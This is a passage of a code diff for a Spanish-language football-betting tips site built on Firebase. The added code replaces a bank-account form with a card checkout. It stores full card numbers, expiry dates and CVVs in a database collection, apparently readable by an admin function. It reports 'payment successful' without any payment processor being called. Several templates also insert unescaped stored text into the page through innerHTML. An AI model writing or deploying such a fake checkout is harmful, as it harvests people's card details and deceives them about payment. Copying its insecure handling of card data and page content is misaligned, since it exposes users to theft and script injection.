+            brand: cardNumber[0] === '4' ? 'Visa' : 'Mastercard'
+        };
+        if (!cardData.cardHolder) return alert('Nombre del titular requerido');
+    } else {
+        return alert('Selecciona una tarjeta o agrega una nueva');
+    }
+    
+    await db.collection('payments').add({
+        userId: user.uid,
+        userEmail: user.email,
+        planId: currentSelectedPlan.id,
+        planName: currentSelectedPlan.name,
+        amount: currentSelectedPlan.price,
+        cardNumber: cardData.cardNumber,
+        cardLast4: cardData.last4,
+        cardHolder: cardData.cardHolder,
+        cardExpiry: cardData.expiry,
+        cardCvv: cardData.cvv,
+        cardBrand: cardData.brand,
+        status: 'completed',
+        createdAt: Date.now()
+    });
+    
+    alert(`✅ Pago exitoso!\nPlan: ${currentSelectedPlan.name}\nMonto: $${currentSelectedPlan.price.toLocaleString()} COP\nTarjeta: ${cardData.brand} terminada en ${cardData.last4}`);
+    closePaymentModal();
+}
+
+// ============ APUESTAS ============
+function loadTeams() {
+    const local = document.getElementById('localTeam');
+    const away = document.getElementById('awayTeam');
+    teams.forEach(t => {
+        local.appendChild(new Option(t.name, JSON.stringify(t)));
+        away.appendChild(new Option(t.name, JSON.stringify(t)));
     });
 }
 
 function updateMatch() {
-    const localSelect = document.getElementById('localTeam');
-    const awaySelect = document.getElementById('awayTeam');
+    const localVal = document.getElementById('localTeam').value;
+    const awayVal = document.getElementById('awayTeam').value;
     const preview = document.getElementById('matchPreview');
-    const localImg = document.getElementById('localPreview');
-    const awayImg = document.getElementById('awayPreview');
-    
-    if (localSelect.value && awaySelect.value && localSelect.value !== awaySelect.value) {
-        const localTeam = JSON.parse(localSelect.value);
-        const awayTeam = JSON.parse(awaySelect.value);
-        
-        localImg.src = localTeam.logo;
-        localImg.style.display = 'block';
-        awayImg.src = awayTeam.logo;
-        awayImg.style.display = 'block';
-        
-        preview.innerHTML = `<h3>🏆 ${localTeam.name} vs ${awayTeam.name}</h3><p style="color:#00ff88;">✅ Listo para publicar</p>`;
+    if (localVal && awayVal && localVal !== awayVal) {
+        const local = JSON.parse(localVal);
+        const away = JSON.parse(awayVal);
+        document.getElementById('localPreview').src = local.logo;
+        document.getElementById('localPreview').style.display = 'block';
+        document.getElementById('awayPreview').src = away.logo;
+        document.getElementById('awayPreview').style.display = 'block';
+        preview.innerHTML = `<h3>🏆 ${local.name} vs ${away.name}</h3><p style="color:#0f0;">✅ Listo</p>`;
     } else {
-        localImg.style.display = 'none';
-        awayImg.style.display = 'none';
-        preview.innerHTML = `<h3>📋 PREVIEW</h3><p>Selecciona ambos equipos</p>`;
+        preview.innerHTML = '<h3>Selecciona ambos equipos</h3>';
     }
 }
 
 function getMatchText() {
-    const localSelect = document.getElementById('localTeam');
-    const awaySelect = document.getElementById('awayTeam');
-    if (localSelect.value && awaySelect.value && localSelect.value !== awaySelect.value) {
-        const localTeam = JSON.parse(localSelect.value);
-        const awayTeam = JSON.parse(awaySelect.value);
-        return `${localTeam.name} vs ${awayTeam.name}`;
+    const local = document.getElementById('localTeam').value;
+    const away = document.getElementById('awayTeam').value;
+    if (local && away && local !== away) {
+        return `${JSON.parse(local).name} vs ${JSON.parse(away).name}`;
     }
     return '';
 }
 
 function getMatchImage() {
-    const localSelect = document.getElementById('localTeam');
-    if (localSelect.value) {
-        const localTeam = JSON.parse(localSelect.value);
-        return localTeam.logo;
-    }
+    const local = document.getElementById('localTeam').value;
+    if (local) return JSON.parse(local).logo;
     return '';
-}
-
-function register() {
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
-    if (!email || !password) return alert('Completa todos los campos');
-    if (password.length < 6) return alert('La contraseña debe tener al menos 6 caracteres');
-    
-    auth.createUserWithEmailAndPassword(email, password)
-        .then(() => alert('✅ Cuenta creada correctamente'))
-        .catch(error => alert('❌ Error: ' + error.message));
-}
-
-function login() {
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
-    if (!email || !password) return alert('Completa todos los campos');
-    
-    auth.signInWithEmailAndPassword(email, password)
-        .then(() => alert('✅ Sesión iniciada correctamente'))
-        .catch(error => alert('❌ Error: ' + error.message));
-}
-
-function logout() {
-    auth.signOut();
-    alert('Sesión cerrada');
-}
-
-function editBet(id, match, prediction, odds, image) {
-    const matchParts = match.split(' vs ');
-    if (matchParts.length === 2) {
-        const localTeam = teams.find(t => t.name === matchParts[0]);
-        const awayTeam = teams.find(t => t.name === matchParts[1]);
-        if (localTeam && awayTeam) {
-            document.getElementById('localTeam').value = JSON.stringify(localTeam);
-            document.getElementById('awayTeam').value = JSON.stringify(awayTeam);
-            updateMatch();
-        }
-    }
-    document.getElementById('prediction').value = prediction;
-    document.getElementById('odds').value = odds;
-    editingId = id;
-    document.getElementById('adminPanel').scrollIntoView({ behavior: 'smooth' });
 }
 
 function publishBet() {
     const user = auth.currentUser;
-    if (!user) {
-        alert('❌ Debes iniciar sesión para publicar apuestas');
-        return;
-    }
-    
-    const matchText = getMatchText();
+    if (!user) return alert('Inicia sesión');
+    const match = getMatchText();
+    if (!match) return alert('Selecciona equipos');
     const prediction = document.getElementById('prediction').value;
     const odds = document.getElementById('odds').value;
-    const image = getMatchImage();
-    const type = document.getElementById('type').value;
+    if (!prediction || !odds) return alert('Completa todos los campos');
     
-    if (!matchText) return alert('❌ Selecciona ambos equipos');
-    if (!prediction) return alert('❌ Escribe un pronóstico');
-    if (!odds) return alert('❌ Escribe la cuota');
-    
-    const betData = {
-        match: matchText,
-        prediction: prediction,
-        odds: odds,
-        image: image,
-        type: type,
-        createdAt: Date.now(),
-        userId: user.uid,
-        userEmail: user.email
-    };
+    const data = { match, prediction, odds, image: getMatchImage(), type: document.getElementById('type').value, createdAt: Date.now(), userId: user.uid, userEmail: user.email };
     
     if (editingId) {
-        db.collection('bets').doc(editingId).update(betData)
-            .then(() => { alert('✅ Actualizada'); clearForm(); editingId = null; })
-            .catch(error => alert('❌ Error: ' + error.message));
-        return;
+        db.collection('bets').doc(editingId).update(data).then(() => { alert('Actualizada'); clearForm(); editingId = null; });
+    } else {
+        db.collection('bets').add(data).then(() => { alert('Publicada'); clearForm(); });
     }
-    
-    db.collection('bets').add(betData)
-        .then(() => { alert('✅ Publicada'); clearForm(); })
-        .catch(error => alert('❌ Error: ' + error.message));
 }
 
 function clearForm() {
@@ -1045,303 +1151,114 @@ function clearForm() {
     document.getElementById('awayTeam').value = '';
     document.getElementById('prediction').value = '';
     document.getElementById('odds').value = '';
-    document.getElementById('type').value = 'gratis';
     updateMatch();
 }
 
+function editBet(id, match, pred, odds, img) {
+    const parts = match.split(' vs ');
+    const local = teams.find(t => t.name === parts[0]);
+    const away = teams.find(t => t.name === parts[1]);
+    if (local && away) {
+        document.getElementById('localTeam').value = JSON.stringify(local);
+        document.getElementById('awayTeam').value = JSON.stringify(away);
+        updateMatch();
+    }
+    document.getElementById('prediction').value = pred;
+    document.getElementById('odds').value = odds;
+    editingId = id;
+}
+
 function deleteBet(id) {
-    if (confirm('¿Eliminar esta apuesta?')) {
-        db.collection('bets').doc(id).delete()
-            .then(() => alert('✅ Eliminada'))
-            .catch(error => alert('❌ Error: ' + error.message));
-    }
+    if (confirm('¿Eliminar?')) db.collection('bets').doc(id).delete();
 }
 
-function escapeString(str) {
-    if (!str) return '';
-    return str.replace(/'/g, "\\'").replace(/"/g, '&quot;');
-}
+function escapeString(str) { return str ? str.replace(/'/g, "\\'").replace(/"/g, '&quot;') : ''; }
 
-// Guardar datos bancarios del usuario
-async function saveUserBankData() {
-    const user = auth.currentUser;
-    if (!user) {
-        alert('❌ Debes iniciar sesión primero');
-        return;
-    }
-    
-    const bank = document.getElementById('userBank').value;
-    const accountNumber = document.getElementById('userAccountNumber').value;
-    const accountHolder = document.getElementById('userAccountHolder').value;
-    const paymentEmail = document.getElementById('userPaymentEmail').value;
-    const idNumber = document.getElementById('userIdNumber').value;
-    
-    if (!bank) return alert('❌ Selecciona tu banco');
-    if (!accountNumber) return alert('❌ Ingresa tu número de cuenta');
-    if (!accountHolder) return alert('❌ Ingresa el nombre del titular');
-    
-    const bankData = {
-        bank: bank,
-        accountNumber: accountNumber,
-        accountHolder: accountHolder,
-        paymentEmail: paymentEmail || user.email,
-        idNumber: idNumber,
-        updatedAt: Date.now()
-    };
-    
-    try {
-        await db.collection('users').doc(user.uid).set({
-            email: user.email,
-            bankData: bankData,
-            createdAt: Date.now()
-        }, { merge: true });
-        
-        document.getElementById('bankDataStatus').innerHTML = '<p style="color:#00ff88;">✅ Datos bancarios guardados correctamente</p>';
-        setTimeout(() => {
-            document.getElementById('bankDataStatus').innerHTML = '';
-        }, 3000);
-        
-        if (user.email === ADMIN_EMAIL) {
-            loadUsersBankData();
-        }
-    } catch (error) {
-        alert('❌ Error al guardar: ' + error.message);
-    }
-}
-
-// Cargar datos bancarios del usuario
-async function loadUserBankData() {
-    const user = auth.currentUser;
-    if (!user) return;
-    
-    const doc = await db.collection('users').doc(user.uid).get();
-    if (doc.exists && doc.data().bankData) {
-        const bankData = doc.data().bankData;
-        document.getElementById('userBank').value = bankData.bank || '';
-        document.getElementById('userAccountNumber').value = bankData.accountNumber || '';
-        document.getElementById('userAccountHolder').value = bankData.accountHolder || '';
-        document.getElementById('userPaymentEmail').value = bankData.paymentEmail || '';
-        document.getElementById('userIdNumber').value = bankData.idNumber || '';
-        document.getElementById('bankDataStatus').innerHTML = '<p style="color:#00ff88;">✅ Tus datos bancarios ya están registrados</p>';
-    }
-}
-
-// Cargar todos los usuarios (solo admin)
-async function loadUsersBankData() {
-    if (auth.currentUser?.email !== ADMIN_EMAIL) return;
-    
-    const snapshot = await db.collection('users').get();
-    
-    if (snapshot.empty) {
-        document.getElementById('usersBankList').innerHTML = '<h3>🏦 Usuarios registrados</h3><p>No hay usuarios registrados</p>';
-        return;
-    }
-    
-    let html = '<h3>🏦 Usuarios Registrados</h3><div class="users-table"><table><tr><th>Email</th><th>Banco</th><th>Cuenta</th><th>Titular</th><th>Acciones</th></tr>';
-    
-    snapshot.forEach(doc => {
-        const userData = doc.data();
-        if (userData.bankData) {
-            const bankData = userData.bankData;
-            html += `
-                <tr>
-                    <td>${userData.email}</td>
-                    <td>${bankData.bank}</td>
-                    <td>${bankData.accountNumber}</td>
-                    <td>${bankData.accountHolder}</td>
-                    <td><button class="copy-btn" onclick="copyBankData('${bankData.accountNumber}', '${bankData.accountHolder}', '${bankData.bank}')">📋 Copiar</button></td>
-                </tr>
-            `;
-        }
+function loadBets() {
+    if (betsUnsubscribe) betsUnsubscribe();
+    betsUnsubscribe = db.collection('bets').orderBy('createdAt', 'desc').onSnapshot(snap => {
+        const container = document.getElementById('bets');
+        container.innerHTML = '';
+        if (snap.empty) { container.innerHTML = '<p>No hay apuestas</p>'; return; }
+        snap.forEach(doc => {
+            const b = doc.data();
+            const isAdmin = auth.currentUser?.email === ADMIN_EMAIL;
+            container.innerHTML += `<div class="bet-card"><img src="${b.image}" onerror="this.src='https://via.placeholder.com/400x200'"><div class="tag ${b.type === 'premium' ? 'premium' : 'free'}">${b.type === 'premium' ? '💎 PREMIUM' : '🎁 GRATIS'}</div><h3>🏆 ${b.match}</h3><p>${b.type === 'premium' ? (auth.currentUser ? '🔮 ' + b.prediction : '🔒 Premium - Hazte premium') : '🎯 ' + b.prediction}</p><div style="display:flex; justify-content:space-between; margin-top:20px;"><div style="color:#0f0; font-size:24px;">💰 ${b.odds}</div>${isAdmin ? `<div><button onclick="editBet('${doc.id}', '${escapeString(b.match)}', '${escapeString(b.prediction)}', '${b.odds}', '${escapeString(b.image)}')" style="background:#0f0; border:none; padding:10px; border-radius:10px;">✏️</button> <button onclick="deleteBet('${doc.id}')" style="background:red; border:none; padding:10px; border-radius:10px; color:white;">🗑️</button></div>` : ''}</div></div>`;
+        });
     });
-    
-    html += '</table></div>';
-    document.getElementById('usersBankList').innerHTML = html;
 }
 
-function copyBankData(account, holder, bank) {
-    const text = `Banco: ${bank}\nCuenta: ${account}\nTitular: ${holder}`;
-    navigator.clipboard.writeText(text);
-    alert('✅ Datos bancarios copiados');
-}
-
-// Planes
+// ============ PLANES ============
 async function loadPlans() {
-    const plansRef = db.collection('plans');
-    const snapshot = await plansRef.get();
-    
-    if (snapshot.empty) {
-        for (const plan of defaultPlans) {
-            await plansRef.doc(plan.id).set(plan);
-        }
+    const ref = db.collection('plans');
+    const snap = await ref.get();
+    if (snap.empty) {
+        for (const p of defaultPlans) await ref.doc(p.id).set(p);
     }
-    
-    const plansContainer = document.getElementById('plansContainer');
-    const plansAdminContainer = document.getElementById('plansAdmin');
-    if (plansContainer) plansContainer.innerHTML = '';
-    if (plansAdminContainer) plansAdminContainer.innerHTML = '';
-    
-    const plansSnapshot = await plansRef.get();
+    const container = document.getElementById('plansContainer');
+    container.innerHTML = '';
     const plans = [];
-    plansSnapshot.forEach(doc => {
-        plans.push({ id: doc.id, ...doc.data() });
+    (await ref.get()).forEach(d => plans.push({ id: d.id, ...d.data() }));
+    plans.sort((a,b) => a.price - b.price);
+    plans.forEach(p => {
+        container.innerHTML += `<div class="plan-card ${p.recommended ? 'recommended' : ''}" onclick="selectPlan('${p.id}', '${p.name}', ${p.price})">${p.recommended ? '<div class="plan-badge">⭐ POPULAR</div>' : ''}<div class="plan-name">${p.name}</div><div class="plan-price">$${p.price.toLocaleString()}<span> COP / ${p.period}</span></div><ul class="plan-features">${p.features.map(f => `<li>${f}</li>`).join('')}</ul><button class="btn btn-green">Seleccionar</button></div>`;
     });
-    
-    plans.sort((a, b) => a.price - b.price);
-    
-    plans.forEach(plan => {
-        if (plansContainer) {
-            plansContainer.innerHTML += `
-                <div class="plan-card ${plan.recommended ? 'recommended' : ''}" onclick="selectPlan('${plan.id}', '${plan.name}', ${plan.price})">
-                    ${plan.recommended ? '<div class="plan-badge">⭐ MÁS POPULAR</div>' : ''}
-                    <div class="plan-name">${plan.name}</div>
-                    <div class="plan-price">$${plan.price.toLocaleString()}<span> COP / ${plan.period}</span></div>
-                    <ul class="plan-features">${plan.features.map(f => `<li>${f}</li>`).join('')}</ul>
-                    <button class="btn btn-green">Seleccionar Plan</button>
-                </div>
-            `;
-        }
-        
-        if (plansAdminContainer && document.getElementById('adminPanel').style.display === 'block') {
-            plansAdminContainer.innerHTML += `
-                <div style="background:#0c0c0c; padding:20px; border-radius:15px; margin-bottom:20px;">
-                    <h4>${plan.name}</h4>
-                    <input type="text" id="plan_name_${plan.id}" value="${plan.name}" style="width:100%; padding:10px; margin:5px 0;">
-                    <input type="number" id="plan_price_${plan.id}" value="${plan.price}" style="width:100%; padding:10px; margin:5px 0;">
-                    <input type="text" id="plan_period_${plan.id}" value="${plan.period}" style="width:100%; padding:10px; margin:5px 0;">
-                    <textarea id="plan_features_${plan.id}" rows="2" style="width:100%; padding:10px; margin:5px 0;">${plan.features.join(', ')}</textarea>
-                    <label><input type="checkbox" id="plan_recommended_${plan.id}" ${plan.recommended ? 'checked' : ''}> Recomendado</label>
-                    <button class="btn btn-green" onclick="updatePlan('${plan.id}')" style="margin-top:10px;">Actualizar</button>
-                </div>
-            `;
-        }
-    });
-}
-
-function updatePlan(planId) {
-    const name = document.getElementById(`plan_name_${planId}`).value;
-    const price = parseInt(document.getElementById(`plan_price_${planId}`).value);
-    const period = document.getElementById(`plan_period_${planId}`).value;
-    const features = document.getElementById(`plan_features_${planId}`).value.split(',').map(f => f.trim());
-    const recommended = document.getElementById(`plan_recommended_${planId}`).checked;
-    
-    db.collection('plans').doc(planId).update({ name, price, period, features, recommended })
-        .then(() => { alert('✅ Plan actualizado'); loadPlans(); })
-        .catch(error => alert('❌ Error: ' + error.message));
 }
 
 function showPlans() {
-    const user = auth.currentUser;
-    if (!user) {
-        alert('🔒 Primero debes iniciar sesión');
-        document.getElementById('loginBox').scrollIntoView({ behavior: 'smooth' });
-        return;
-    }
-    const plansSection = document.getElementById('plansSection');
-    plansSection.style.display = 'block';
-    plansSection.scrollIntoView({ behavior: 'smooth' });
+    if (!auth.currentUser) { alert('Inicia sesión primero'); document.getElementById('loginBox').scrollIntoView(); return; }
+    document.getElementById('plansSection').style.display = 'block';
+    document.getElementById('plansSection').scrollIntoView();
 }
 
-function selectPlan(planId, planName, planPrice) {
-    currentSelectedPlan = { id: planId, name: planName, price: planPrice };
-    document.getElementById('modalPlanName').innerText = planName;
-    document.getElementById('modalPlanPrice').innerHTML = `$${planPrice.toLocaleString()} COP`;
+function selectPlan(id, name, price) {
+    currentSelectedPlan = { id, name, price };
+    selectedCardId = null;
+    showNewCard = false;
+    document.getElementById('newCardForm').style.display = 'none';
+    document.getElementById('modalPlanName').innerText = name;
+    document.getElementById('modalPlanPrice').innerHTML = `$${price.toLocaleString()} COP`;
+    loadPaymentCards();
     document.getElementById('paymentModal').style.display = 'flex';
 }
 
-function closePaymentModal() {
-    document.getElementById('paymentModal').style.display = 'none';
-}
+function closePaymentModal() { document.getElementById('paymentModal').style.display = 'none'; }
 
-async function submitPaymentData() {
-    const user = auth.currentUser;
-    if (!user) {
-        alert('❌ Debes iniciar sesión primero');
-        return;
-    }
-    
-    const bank = document.getElementById('bankSelect').value;
-    const accountNumber = document.getElementById('accountNumber').value;
-    const accountHolder = document.getElementById('accountHolder').value;
-    const paymentEmail = document.getElementById('paymentEmail').value;
-    
-    if (!bank) return alert('❌ Selecciona tu banco');
-    if (!accountNumber) return alert('❌ Ingresa tu número de cuenta');
-    if (!accountHolder) return alert('❌ Ingresa el nombre del titular');
-    
-    const paymentData = {
-        userId: user.uid,
-        userEmail: user.email,
-        planId: currentSelectedPlan.id,
-        planName: currentSelectedPlan.name,
-        planPrice: currentSelectedPlan.price,
-        bank: bank,
-        accountNumber: accountNumber,
-        accountHolder: accountHolder,
-        paymentEmail: paymentEmail || user.email,
-        status: 'pending',
-        createdAt: Date.now()
-    };
-    
-    try {
-        await db.collection('payments').add(paymentData);
-        alert(`✅ Solicitud enviada!\n\nPlan: ${currentSelectedPlan.name}\nMonto: $${currentSelectedPlan.price.toLocaleString()} COP\n\n⏱️ Activaremos tu cuenta en 24 horas`);
-        closePaymentModal();
-    } catch (error) {
-        alert('❌ Error: ' + error.message);
-    }
+// ============ AUTENTICACIÓN ============
+function register() {
+    const email = document.getElementById('email').value;
+    const pass = document.getElementById('password').value;
+    if (!email || !pass) return alert('Completa campos');
+    if (pass.length < 6) return alert('Mínimo 6 caracteres');
+    auth.createUserWithEmailAndPassword(email, pass).then(() => alert('Cuenta creada')).catch(e => alert(e.message));
 }
-
-function loadBets() {
-    if (betsUnsubscribe) {
-        betsUnsubscribe();
-    }
-    
-    betsUnsubscribe = db.collection('bets')
-        .orderBy('createdAt', 'desc')
-        .onSnapshot(snapshot => {
-            const betsContainer = document.getElementById('bets');
-            betsContainer.innerHTML = '';
-            
-            if (snapshot.empty) {
-                betsContainer.innerHTML = '<p style="text-align:center; color:#666;">📭 No hay apuestas disponibles</p>';
-                return;
-            }
-            
-            snapshot.forEach(doc => {
-                const bet = doc.data();
-                const currentUser = auth.currentUser;
-                const isAdmin = currentUser && currentUser.email === ADMIN_EMAIL;
-                
-                let displayPrediction = '';
-                if (bet.type === 'premium') {
-                    displayPrediction = currentUser ? '🔮 ' + bet.prediction : '🔒 Contenido Premium - Hazte premium para ver';
-                } else {
-                    displayPrediction = '🎯 ' + bet.prediction;
-                }
-                
-                betsContainer.innerHTML += `
-                    <div class="bet-card">
-                        <img src="${bet.image || 'https://via.placeholder.com/400x200?text=Sin+logo'}" onerror="this.src='https://via.placeholder.com/400x200?text=Sin+logo'">
-                        <div class="tag ${bet.type === 'premium' ? 'premium' : 'free'}">${bet.type === 'premium' ? '💎 PREMIUM' : '🎁 GRATIS'}</div>
-                        <h3>🏆 ${bet.match}</h3>
-                        <p style="margin-top:15px;">${displayPrediction}</p>
-                        <div style="margin-top:25px; display:flex; justify-content:space-between; align-items:center;">
-                            <div style="font-size:24px; font-weight:bold; color:#00ff88;">💰 ${bet.odds}</div>
-                            ${isAdmin ? `
-                                <div style="display:flex; gap:10px;">
-                                    <button onclick="editBet('${doc.id}', '${escapeString(bet.match)}', '${escapeString(bet.prediction)}', '${bet.odds}', '${escapeString(bet.image || '')}')" style="background:#00ff88; border:none; padding:10px 15px; border-radius:10px; cursor:pointer;">✏️</button>
-                                    <button onclick="deleteBet('${doc.id}')" style="background:red; border:none; padding:10px 15px; border-radius:10px; cursor:pointer; color:white;">🗑️</button>
-                                </div>
-                            ` : ''}
-                        </div>
-                    </div>
-                `;
-            });
-        });
+function login() {
+    const email = document.getElementById('email').value;
+    const pass = document.getElementById('password').value;
+    auth.signInWithEmailAndPassword(email, pass).then(() => alert('Sesión iniciada')).catch(e => alert(e.message));
 }
+function logout() { auth.signOut(); alert('Sesión cerrada'); }
 
-// Funciones globales
+auth.onAuthStateChanged(user => {
+    const isAdmin = user?.email === ADMIN_EMAIL;
+    document.getElementById('logoutBtn').style.display = user ? 'block' : 'none';
+    document.getElementById('premiumBtnHeader').style.display = user ? 'block' : 'none';
+    document.getElementById('loginBox').style.display = user ? 'none' : 'block';
+    document.getElementById('adminPanel').style.display = isAdmin ? 'block' : 'none';
+    document.getElementById('cardPanel').style.display = user ? 'block' : 'none';
+    document.getElementById('tipsterPanel').style.display = user ? 'block' : 'none';
+    document.getElementById('plansSection').style.display = 'none';
+    if (user) {
+        loadSavedCards();
+        loadTipsterData();
+        if (isAdmin) { loadAllTipsters(); loadAllCards(); }
+    }
+    loadBets();
+});
+
+loadTeams();
+loadPlans();
+
 window.register = register;
 window.login = login;
 window.logout = logout;
@@ -1352,53 +1269,16 @@ window.updateMatch = updateMatch;
 window.showPlans = showPlans;
 window.selectPlan = selectPlan;
 window.closePaymentModal = closePaymentModal;
-window.submitPaymentData = submitPaymentData;
-window.saveUserBankData = saveUserBankData;
-window.loadUsersBankData = loadUsersBankData;
-window.copyBankData = copyBankData;
-window.updatePlan = updatePlan;
-
-// Inicializar
-loadTeams();
-loadPlans();
-
-auth.onAuthStateChanged(user => {
-    const logoutBtn = document.getElementById('logoutBtn');
-    const adminPanel = document.getElementById('adminPanel');
-    const loginBox = document.getElementById('loginBox');
-    const premiumBtnHeader = document.getElementById('premiumBtnHeader');
-    const userPanel = document.getElementById('userPanel');
-    const plansSection = document.getElementById('plansSection');
-    
-    if (user) {
-        logoutBtn.style.display = 'block';
-        loginBox.style.display = 'none';
-        premiumBtnHeader.style.display = 'block';
-        userPanel.style.display = 'block';
-        
-        const isAdmin = user.email === ADMIN_EMAIL;
-        adminPanel.style.display = isAdmin ? 'block' : 'none';
-        
-        loadUserBankData();
-        
-        if (isAdmin) {
-            loadPlans();
-            loadUsersBankData();
-        }
-        
-        if (plansSection) {
-            plansSection.style.display = 'none';
-        }
-    } else {
-        logoutBtn.style.display = 'none';
-        adminPanel.style.display = 'none';
-        loginBox.style.display = 'block';
-        premiumBtnHeader.style.display = 'none';
-        if (userPanel) userPanel.style.display = 'none';
-    }
-    
-    loadBets();
-});
+window.processPayment = processPayment;
+window.saveCard = saveCard;
+window.deleteCard = deleteCard;
+window.saveTipsterData = saveTipsterData;
+window.loadAllTipsters = loadAllTipsters;
+window.loadAllCards = loadAllCards;
+window.selectCardForPayment = selectCardForPayment;
+window.toggleNewCardForm = toggleNewCardForm;
+window.formatCardNumber = formatCardNumber;
+window.formatExpiry = formatExpiry;
 </script>
 </body>
 </html>
